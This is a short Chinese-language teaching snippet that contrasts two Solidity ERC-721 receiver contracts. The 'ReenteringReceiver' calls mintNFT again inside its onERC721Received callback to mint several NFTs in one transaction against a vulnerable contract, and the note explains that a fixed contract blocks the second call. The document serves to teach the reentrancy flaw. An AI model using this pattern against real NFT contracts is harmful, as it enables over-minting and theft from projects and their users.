正常接收 · HonestReceiver

只确认能收 NFT（防锁死），回调里不再调用 mint。即使铸造侧是 Vulnerable，通常也只有 1 枚。

function onERC721Received(...)
  external returns (bytes4)
{
  nfts += 1;
  return IERC721Receiver
    .onERC721Received.selector;
}

教学重入 · ReenteringReceiver

回调身体里再进 mint。配合 Vulnerable 会在同笔交易多枚；配合 Fixed 则第二次失败。对应仓内 HypeBearsCallbackStudent。

function onERC721Received(...)
  external returns (bytes4)
{
  nfts += 1;
  if (!target.minted(address(this))) {
    try target.mintNFT() {} catch {}
  }
  return IERC721Receiver
    .onERC721Received.selector;
}
